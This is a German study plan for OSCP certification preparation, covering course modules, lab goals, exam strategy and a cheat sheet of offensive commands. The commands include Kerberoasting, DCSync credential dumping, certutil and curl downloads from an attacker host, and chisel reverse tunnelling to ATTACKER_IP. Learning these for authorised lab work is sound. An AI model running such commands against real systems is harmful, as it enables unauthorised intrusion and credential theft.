# MONATE 13-15 — OSCP LAB + PRÜFUNG

## DAS LEVEL: OSCP ist der universell respektierte Beweis für Offensive Skills

---

## MONATS-ZIELE (über 3 Monate)
- [ ] OffSec PEN-200 Kurs komplett durchgearbeitet
- [ ] 60+ Lab-Maschinen gerootet (alle Netzwerke)
- [ ] Proving Grounds: 30+ Practice-Maschinen
- [ ] Report-Writing: 5+ vollständige Pentest-Reports
- [ ] OSCP-Prüfung: BESTANDEN (Monat 15)
- [ ] Bonus Objectives: 3/3 AD Sets in der Prüfung

---

## MONAT 13 — KURS + FUNDAMENTALS

### Woche 49-52

**Strategie:** PEN-200 Kurs systematisch durcharbeiten. Jedes Modul HANDS-ON, nicht nur lesen.

**Module in Reihenfolge:**
1. Report Writing (JA, fang damit an — Reports sind 50% der Prüfung)
2. Information Gathering (Reconnaissance, Enumeration)
3. Vulnerability Scanning
4. Web Application Attacks (du hast PortSwigger schon — hier vertiefst du)
5. SQL Injection Attacks
6. Client-Side Attacks
7. Public Exploits (Searchsploit, ExploitDB, GitHub)
8. Fixing Exploits (Anpassen an reale Umgebungen)
9. File Transfers
10. Antivirus Evasion (Grundlagen)
11. Password Attacks
12. Port Redirection / Tunneling
13. Active Directory (DU HAST HIER EINEN VORSPRUNG — Monat 8!)
14. Linux Privilege Escalation
15. Windows Privilege Escalation

**Parallel:** Jeden Abend 1-2 Lab-Maschinen rooten

---

## MONAT 14 — LAB GRIND

### Woche 53-56

**Lab-Strategie:**
- Methodisch vorgehen: Enumeration → Exploitation → Post-Exploitation → Privilege Escalation
- KEINE Walkthroughs vor eigenem Versuch (min. 2h pro Maschine)
- FÜR JEDE MASCHINE: Notizen schreiben (Screenshots, Befehle, Findings)
- Diese Notizen werden dein Report-Template

**Priorisierung:**
- Active Directory Sets ZUERST (40 Punkte in der Prüfung!)
- Linux Maschinen (häufig in der Prüfung)
- Windows Maschinen (Privilege Escalation üben)

**Zusätzlich (Abends):**
- Proving Grounds Practice: 2 Maschinen pro Woche
- TJ Null's OSCP-Like HTB Maschinen durcharbeiten

---

## MONAT 15 — PRÜFUNGSVORBEREITUNG + PRÜFUNG

### Woche 57-58: Intensive Vorbereitung
- Schwachstellen identifizieren und gezielt üben
- Mock-Prüfung: 24h an 5 Maschinen (simuliere Prüfungsbedingungen)
- Report-Template finalisieren (mit Screenshots, Code, Erklärungen)
- Buffer Overflow Maschine üben (falls in der aktuellen Version noch relevant)

### Woche 59: PRÜFUNG
- 23 Stunden 45 Minuten für den Prüfungsteil
- 24 Stunden für den Report
- **Prüfungsstrategie:**
  1. AD Set ZUERST (3 Maschinen, 40 Punkte)
  2. Dann standalone Maschinen (jeweils 10 Punkte bei local.txt + 10 bei proof.txt)
  3. Minimum zum Bestehen: 70 Punkte
  4. Ziel: 90+ Punkte (AD Set komplett + 2-3 Standalone)

### Woche 60: Post-Exam
- Blog-Post: "My OSCP Journey" (WIRD extrem viel Traffic bekommen)
- OSCP-Badge auf LinkedIn/CV
- Nächste Phase vorbereiten

---

## OSCP CHEAT SHEET — Die wichtigsten Befehle

```bash
# ENUMERATION
nmap -sC -sV -oA nmap/initial <IP>
nmap -p- -T4 -oA nmap/allports <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# PRIVILEGE ESCALATION — Linux
linpeas.sh
find / -perm -u=s -type f 2>/dev/null  # SUID Binaries
cat /etc/crontab  # Cron Jobs
getcap -r / 2>/dev/null  # Capabilities
# GTFOBins: gtfobins.github.io

# PRIVILEGE ESCALATION — Windows
winPEASx64.exe
whoami /priv  # SeImpersonatePrivilege → Potato Attacks
net user
net localgroup administrators
cmdkey /list  # Saved Credentials

# ACTIVE DIRECTORY
bloodhound-python -d domain.local -u user -p pass -c all
impacket-GetUserSPNs domain.local/user:pass -request  # Kerberoasting
impacket-secretsdump domain.local/admin:pass@DC_IP  # DCSync
crackmapexec smb <SUBNET>/24 -u user -p pass --shares
evil-winrm -i <IP> -u admin -p pass

# FILE TRANSFER
python3 -m http.server 80  # Attacker → Victim
certutil -urlcache -f http://<IP>/file.exe file.exe  # Windows Download
curl http://<IP>/file -o /tmp/file  # Linux Download

# PIVOTING
chisel server -p 8000 --reverse  # Attacker
chisel client <ATTACKER_IP>:8000 R:socks  # Victim
proxychains nmap -sT <INTERNAL_IP>
```

---

## KPI-CHECKLISTE MONATE 13-15

| KPI | Ziel | Status |
|-----|------|--------|
| PEN-200 Kurs | Komplett durchgearbeitet | [ ] |
| Lab-Maschinen | 60+ gerootet | [ ] |
| AD Sets | Alle 3 in Labs gelöst | [ ] |
| PG Practice | 30+ Maschinen | [ ] |
| Reports | 5+ vollständige Reports | [ ] |
| Mock-Prüfung | 24h Simulation | [ ] |
| OSCP | BESTANDEN | [ ] |
| Blog | OSCP Journey Post | [ ] |
